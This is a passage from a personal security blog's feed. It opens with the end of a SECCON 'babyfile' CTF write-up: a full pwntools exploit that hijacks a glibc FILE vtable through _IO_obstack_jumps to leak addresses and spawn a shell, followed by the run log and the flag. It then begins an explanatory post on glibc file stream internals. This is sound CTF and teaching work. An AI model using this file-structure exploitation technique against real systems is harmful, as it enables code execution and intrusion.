        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /home/nasm/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">class</span> <span class="nc">File</span><span class="p">:</span>
    <span class="n">flags</span>          <span class="o">=</span> <span class="mh">0x0</span>
    <span class="n">_IO_read_base</span>  <span class="o">=</span> <span class="mi">24</span>
    <span class="n">_IO_read_end</span>   <span class="o">=</span> <span class="mh">0x10</span>
    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x20</span>
    <span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mh">0x28</span>
    <span class="n">_IO_write_end</span>  <span class="o">=</span> <span class="mh">0x30</span>
    <span class="n">_IO_buf_base</span>   <span class="o">=</span> <span class="mh">0x38</span>
    <span class="n">_IO_buf_end</span>    <span class="o">=</span> <span class="mh">0x40</span>
    <span class="n">fileno</span>         <span class="o">=</span> <span class="mh">0x70</span>
    <span class="n">vtable</span>         <span class="o">=</span> <span class="mh">0xd8</span>
    <span class="n">obstack</span>       <span class="o">=</span> <span class="mh">0xe0</span>

<span class="k">class</span> <span class="nc">obstack</span><span class="p">:</span>
    <span class="n">chunkfun</span>       <span class="o">=</span> <span class="mi">56</span>
    <span class="n">extra_arg</span>      <span class="o">=</span> <span class="mi">56</span><span class="o">+</span><span class="mi">16</span>
    <span class="n">use_extra_arg</span>  <span class="o">=</span> <span class="mi">56</span><span class="o">+</span><span class="mi">16</span><span class="o">+</span><span class="mi">8</span>

<span class="k">def</span> <span class="nf">fflush</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">trick</span><span class="p">(</span><span class="n">offt</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;offset: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offt</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;value: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
            <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">partial_write2</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">partial_write</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">leak_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
    
    <span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>

    <span class="n">fflush</span><span class="p">()</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># do_allocate</span>
    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
    <span class="n">fflush</span><span class="p">()</span>

    <span class="c1"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x60</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
    <span class="n">fflush</span><span class="p">()</span>

    <span class="s2">&#34;&#34;&#34;
</span><span class="s2">    int
</span><span class="s2">    _IO_default_pbackfail (FILE *fp, int c)
</span><span class="s2">    =&gt; not _IO_IN_BACKUP         0x0100
</span><span class="s2">    =&gt; _IO_read_base == _IO_write_ptr
</span><span class="s2">    =&gt; _IO_read_end == _IO_write_ptr + 8
</span><span class="s2">    =&gt; _IO_write_end = right size
</span><span class="s2">    &#34;&#34;&#34;</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>

    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>

    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x78</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">fileno</span><span class="p">)</span>
    <span class="n">fflush</span><span class="p">()</span>

    <span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2160c0</span> <span class="o">+</span> <span class="mh">0x2d160</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span>

    <span class="n">leak_main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1ed5a0</span>

    <span class="n">heap</span> <span class="o">=</span> <span class="n">leak_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_main_arena</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2a0</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">_IO_obstack_jumps</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1E9260</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_IO_obstack_jumps: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># edit vtable =&gt; _IO_obstack_jumps</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">9</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">obstack</span><span class="p">)</span>

    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_read_base</span><span class="p">)</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">chunkfun</span><span class="p">)</span> <span class="c1"># fn ptr, system</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">extra_arg</span><span class="p">)</span> <span class="c1"># arg</span>
    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="kc">True</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">use_extra_arg</span><span class="p">)</span>

    <span class="n">fflush</span><span class="p">()</span>
    <span class="c1"># system(&#34;/bin/sh&#34;)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">type = struct _IO_FILE {
</span><span class="s2">/*      0      |       4 */    int _flags;
</span><span class="s2">/* XXX  4-byte hole      */
</span><span class="s2">/*      8      |       8 */    char *_IO_read_ptr;
</span><span class="s2">/*     16      |       8 */    char *_IO_read_end;
</span><span class="s2">/*     24      |       8 */    char *_IO_read_base;
</span><span class="s2">/*     32      |       8 */    char *_IO_write_base;
</span><span class="s2">/*     40      |       8 */    char *_IO_write_ptr;
</span><span class="s2">/*     48      |       8 */    char *_IO_write_end;
</span><span class="s2">/*     56      |       8 */    char *_IO_buf_base;
</span><span class="s2">/*     64      |       8 */    char *_IO_buf_end;
</span><span class="s2">/*     72      |       8 */    char *_IO_save_base;
</span><span class="s2">/*     80      |       8 */    char *_IO_backup_base;
</span><span class="s2">/*     88      |       8 */    char *_IO_save_end;
</span><span class="s2">/*     96      |       8 */    struct _IO_marker *_markers;
</span><span class="s2">/*    104      |       8 */    struct _IO_FILE *_chain;
</span><span class="s2">/*    112      |       4 */    int _fileno;
</span><span class="s2">/*    116      |       4 */    int _flags2;
</span><span class="s2">/*    120      |       8 */    __off_t _old_offset;
</span><span class="s2">/*    128      |       2 */    unsigned short _cur_column;
</span><span class="s2">/*    130      |       1 */    signed char _vtable_offset;
</span><span class="s2">/*    131      |       1 */    char _shortbuf[1];
</span><span class="s2">/* XXX  4-byte hole      */
</span><span class="s2">/*    136      |       8 */    _IO_lock_t *_lock;
</span><span class="s2">/*    144      |       8 */    __off64_t _offset;
</span><span class="s2">/*    152      |       8 */    struct _IO_codecvt *_codecvt;
</span><span class="s2">/*    160      |       8 */    struct _IO_wide_data *_wide_data;
</span><span class="s2">/*    168      |       8 */    struct _IO_FILE *_freeres_list;
</span><span class="s2">/*    176      |       8 */    void *_freeres_buf;
</span><span class="s2">/*    184      |       8 */    size_t __pad5;
</span><span class="s2">/*    192      |       4 */    int _mode;
</span><span class="s2">/*    196      |      20 */    char _unused2[20];
</span><span class="s2">
</span><span class="s2">                               /* total size (bytes):  216 */
</span><span class="s2">                             }
</span><span class="s2">
</span><span class="s2">struct obstack          /* control current object in current chunk */
</span><span class="s2">{
</span><span class="s2">  long chunk_size;              /* preferred size to allocate chunks in */
</span><span class="s2">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
</span><span class="s2">  char *object_base;            /* address of object we are building */
</span><span class="s2">  char *next_free;              /* where to add next char to current object */
</span><span class="s2">  char *chunk_limit;            /* address of char after current chunk */
</span><span class="s2">  union
</span><span class="s2">  {
</span><span class="s2">    PTR_INT_TYPE tempint;
</span><span class="s2">    void *tempptr;
</span><span class="s2">  } temp;                       /* Temporary for some macros.  */
</span><span class="s2">  int alignment_mask;           /* Mask of alignment for each object. */
</span><span class="s2">  /* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
</span><span class="s2">     casts to the prototypeless function type in all assignments,
</span><span class="s2">     but having prototypes here quiets -Wstrict-prototypes.  */
</span><span class="s2">  struct _obstack_chunk *(*chunkfun) (void *, long);
</span><span class="s2">  void (*freefun) (void *, struct _obstack_chunk *);
</span><span class="s2">  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
</span><span class="s2">  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
</span><span class="s2">  unsigned maybe_empty_object : 1; /* There is a possibility that the current
</span><span class="s2">				      chunk contains a zero-length object.  This
</span><span class="s2">				      prevents freeing the chunk if we allocate
</span><span class="s2">				      a bigger chunk to replace it. */
</span><span class="s2">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
</span><span class="s2">				     handler on error, but retained for binary
</span><span class="s2">				     compatibility.  */
</span><span class="s2">};
</span><span class="s2">
</span><span class="s2">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157
</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;
</span><span class="s2">    Arch:     amd64-64-little
</span><span class="s2">    RELRO:    Full RELRO
</span><span class="s2">    Stack:    Canary found
</span><span class="s2">    NX:       NX enabled
</span><span class="s2">    PIE:      PIE enabled
</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;
</span><span class="s2">    Arch:     amd64-64-little
</span><span class="s2">    RELRO:    Partial RELRO
</span><span class="s2">    Stack:    Canary found
</span><span class="s2">    NX:       NX enabled
</span><span class="s2">    PIE:      PIE enabled
</span><span class="s2">[+] Opening connection to babyfile.seccon.games on port 3157: Done
</span><span class="s2">[*] libc: 0x7fe2bc538000
</span><span class="s2">[*] heap: 0x55fd27776000
</span><span class="s2">[*] _IO_obstack_jumps: 0x7fe2bc721260
</span><span class="s2">[*] Switching to interactive mode
</span><span class="s2">SECCON</span><span class="si">{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}</span><span class="s2">
</span><span class="s2">[*] Got EOF while reading in interactive
</span><span class="s2">$
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div>
  </div>
</div>

]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/file-stream" term="file-stream" label="file stream" />
                             
                                <category scheme="https://nasm.re/tags/SECCON" term="SECCON" label="SECCON" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[Linux file stream internals for fun and profit]]></title>
            <link href="https://nasm.re/posts/filestream/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/filestream/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-08-19T00:00:00+00:00</published>
            <updated>2022-08-19T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/filestream/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>File streams are now a very common attack surface, here is a high level introduction that should make you understand the design of known attacks beyond the code reading for a particular function. I already talked about FSOP <a
  class="gblog-markdown__link"
  href="../catastrophe/#fsop-on-stdout-to-leak-environ"
  
  >here</a
>. This article reviews <a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.36/source"
  
  >glibc 2.36</a
>. Most of this article comes from <a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >this</a
> awesome series of articles about the <code>_IO_FILE</code> strcuture.</p>



  <div class="gblog-toc gblog-toc__level--5">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#global-design">Global design</a></li>
    <li><a href="#common-functions">Common functions</a></li>
    <li><a href="#fopen">fopen</a></li>
    <li><a href="#fread">fread</a>
      <ul>
        <li><a href="#_io_file_xsgetn_mmap">_IO_file_xsgetn_mmap</a></li>
      </ul>
    </li>
  </ul>
</nav>
    <hr />
  </div>


<div class="gblog-post__anchorwrap">
    <h1 id="global-design">
        Global design
        <a data-clipboard-text="https://nasm.re/posts/filestream/#global-design" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Global design" href="#global-design">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>As said in my previous writeup:</p>
<blockquote>
<p>Basically on linux “everything is a file” from the character device the any stream (error, input, output, opened file) we can interact with a resource by just by opening it and getting a file descriptor on it, right ? This way each file descripor has an associated structure called FILE you may have used if you have already done some stuff with files on linux.</p>
</blockquote>
<p>The <code>struct _IO_FILE</code> is defined as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
</span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
</span><span class="cm">   That name should not be used in new code.  */</span>
<span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="cp"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don&#39;t get into trouble again.  */</span>
